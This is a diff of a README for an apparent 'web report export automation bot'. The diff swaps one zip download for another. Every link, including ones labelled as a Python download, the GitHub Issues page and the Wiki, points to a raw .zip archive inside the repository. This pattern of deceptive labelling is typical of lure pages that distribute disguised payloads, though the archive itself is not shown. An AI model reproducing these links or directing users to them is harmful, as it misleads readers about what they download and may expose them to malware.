@@ -1,6 +1,6 @@
 # 🤖 web-report-export-automation-bot - Effortless Secure Report Exporting
 
-[![Download Latest Release](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/web-report-export-automation-bot-v1.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/web-report-export-automation-bot-v1.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/export-web-automation-bot-report-3.7.zip%20release-brightgreen)](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/export-web-automation-bot-report-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ Welcome! This guide will help you set up the Web Report Export Automation Bot. T
 To run this application, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, MacOS, or a Linux distribution.
-- **Python:** Version 3.6 or higher. If you don't have Python, you can [download it here](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/web-report-export-automation-bot-v1.3.zip).
+- **Python:** Version 3.6 or higher. If you don't have Python, you can [download it here](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/export-web-automation-bot-report-3.7.zip).
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 150 MB free space.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/web-report-export-automation-bot-v1.3.zip)
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/export-web-automation-bot-report-3.7.zip)
 
 1. Click on the **latest release** version listed on the page.
 2. Download the appropriate file for your operating system. 
@@ -82,10 +82,10 @@ If you encounter issues, try the following steps:
 
 ## 📞 Support & Feedback
 
-If you need assistance, please create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/web-report-export-automation-bot-v1.3.zip). We encourage feedback to help improve the application.
+If you need assistance, please create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/export-web-automation-bot-report-3.7.zip). We encourage feedback to help improve the application.
 
-For additional tutorials and user feedback, visit our [Wiki](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/web-report-export-automation-bot-v1.3.zip).
+For additional tutorials and user feedback, visit our [Wiki](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/export-web-automation-bot-report-3.7.zip).
 
-Again, to download the application, please visit this page: [Releases Page](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/web-report-export-automation-bot-v1.3.zip). 
+Again, to download the application, please visit this page: [Releases Page](https://raw.githubusercontent.com/bentechstore490/web-report-export-automation-bot/main/media/export-web-automation-bot-report-3.7.zip). 
 
 Thank you for using the Web Report Export Automation Bot! Your secure reporting solution is here to simplify your workflows.
